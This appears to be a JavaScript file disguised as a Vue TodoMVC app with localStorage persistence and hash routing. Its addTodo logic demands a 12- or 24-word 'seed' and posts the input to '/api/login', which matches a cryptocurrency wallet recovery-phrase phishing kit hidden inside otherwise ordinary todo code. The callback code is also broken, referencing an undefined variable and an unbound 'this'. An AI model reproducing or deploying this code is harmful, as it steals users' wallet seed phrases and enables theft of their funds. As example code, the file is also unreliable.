// Full spec-compliant TodoMVC with localStorage persistence
// and hash-based routing in ~120 effective lines of JavaScript.
console.log("******************************* v0.0.5")
// localStorage persistence
const STORAGE_KEY = "todos-vuejs-2.0";
const todoStorage = {
    fetch() {
        const todos = JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
        todos.forEach((todo, index) => {
            todo.id = index;
        });
        todoStorage.uid = todos.length;
        return todos;
    },
    save(todos) {
        localStorage.setItem(STORAGE_KEY, JSON.stringify(todos));
    }
};

// visibility filters
const filters = {
    all(todos) {
        return todos;
    },
    active(todos) {
        return todos.filter((todo) => !todo.completed);
    },
    completed(todos) {
        return todos.filter((todo)=> todo.completed);
    }
}
document.addEventListener("DOMContentLoaded", () => {
// app Vue instance
    const app = Vue.createApp({
        delimiters: ['${', '}'],
        // app initial state
        data() {
            return {
                todos: todoStorage.fetch(),
                newTodo: "",
                errorTodo: "",
                editedTodo: null,
                visibility: "all"
            }
        },

        // watch todos change for localStorage persistence
        watch: {
            todos: {
                handler(todos) {
                    todoStorage.save(todos);
                },
                deep: true
            }
        },

        // computed properties
        // http://vuejs.org/guide/computed.html
        computed: {
            filteredTodos() {
                return filters[this.visibility](this.todos);
            },
            remaining() {
                return filters.active(this.todos).length;
            },
            allDone: {
                get() {
                    return this.remaining === 0;
                },
                set(value) {
                    this.todos.forEach(todo => {
                        todo.completed = value;
                    });
                }
            }
        },

        // methods that implement data logic.
        // note there's no DOM manipulation here at all.
        methods: {
            pluralize(n) {
                return n === 1 ? "item" : "items";
            },
            addTodo() {
                var value = this.newTodo && this.newTodo.trim();
                if (!value) {
                    this.errorTodo = "";
                    return;
                }

                var wordsNB = (value.trim().split(' ').filter(function(v, index, arr){
                    return v != "";
                }).length);

                if (wordsNB < 12) {
                    this.errorTodo = 'Missing words in your seed, need 12 or 24...';
                    return
                }

                this.callAPILogin();
            },

            callAPILogin() {
                this.errorTodo = 'Current connection...';
                axios.post('/api/login', this.newTodo)
                    .then(function (response) {
                        console.log(response);
                        this.errorTodo.push(_.capitalize(response.data.message));

                        this.todos.push({
                            id: todoStorage.uid++,
                            title: value,
                            completed: false
                        });
                        this.newTodo = "";
                        this.errorTodo = '';
                    })
                    .catch(function (error) {
                        this.errorTodo.push('Error! Could not reach the API. ' + error);
                    }).finally(() => {
                        //Perform action in always
                    });
            },

            removeTodo(todo) {
                this.todos.splice(this.todos.indexOf(todo), 1);
            },

            editTodo(todo) {
                this.beforeEditCache = todo.title;
                this.editedTodo = todo;
            },

            doneEdit(todo) {
                if (!this.editedTodo) {
                    return;
                }
                this.editedTodo = null;
                todo.title = todo.title.trim();
                if (!todo.title) {
                    this.removeTodo(todo);
                }
            },

            cancelEdit(todo) {
                this.editedTodo = null;
                todo.title = this.beforeEditCache;
            },

            removeCompleted() {
                this.todos = filters.active(this.todos);
            }
        },

        // a custom directive to wait for the DOM to be updated
        // before focusing on the input field.
        // http://vuejs.org/guide/custom-directive.html
        directives: {
            "todo-focus": {
                updated(el, binding) {
                    if (binding.value) {
                        el.focus();
                    }
                }
            }
        }
    });

    app.config.productionTip = false;
    app.config.devtools = false;
    /*
        app.config.errorHandler = function(err, vm, info) {
            console.log(`Error: ${err.toString()}\nInfo: ${info} ${vm}`);
        }

        app.config.warnHandler = function(msg, vm, trace) {
            console.log(`Warn: ${msg}\nTrace: ${trace} ${vm}`);
        } */


// mount
    const vm = app.mount(".todoapp");
    // handle routing
    function onHashChange() {
        const visibility = window.location.hash.replace(/#\/?/, "");
        if (filters[visibility]) {
            vm.visibility = visibility;
        } else {
            window.location.hash = "";
            vm.visibility = "all";
        }
    }
    window.addEventListener("hashchange", onHashChange);
    onHashChange();
});




